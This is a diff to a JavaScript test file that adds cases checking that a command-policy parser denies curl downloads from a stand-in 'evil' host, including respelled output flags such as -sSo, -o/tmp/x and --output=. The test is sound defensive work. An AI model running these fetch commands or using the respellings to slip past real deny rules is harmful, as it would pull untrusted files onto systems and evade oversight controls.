@@ -703,6 +703,11 @@ test('parseLxcCommand: deny_always wins, including reordered curl output flags',
     'curl -o /tmp/x http://evil/', 'curl --output /tmp/x http://evil/',
     // The reordering hole: -o buried behind other flags must still be denied.
     'curl -sS -o /tmp/x http://evil/', 'curl -fsSL http://evil/ -o /opt/app/x',
+    // The respelling holes: the same flag clustered (-sSo), attached
+    // (-o/tmp/x), joined (--output=/tmp/x), or capital -O in a cluster.
+    'curl -sSo /tmp/x http://evil/', 'curl -o/tmp/x http://evil/',
+    'curl --output=/tmp/x http://evil/', 'curl -sSO http://evil/x',
+    'curl -fsSLo/opt/app/x http://evil/',
   ]) {
     const r = parseLxcCommand(cmd, LXC_POLICY, WD);
     assert.ok(r.error, `should deny: ${cmd}`);
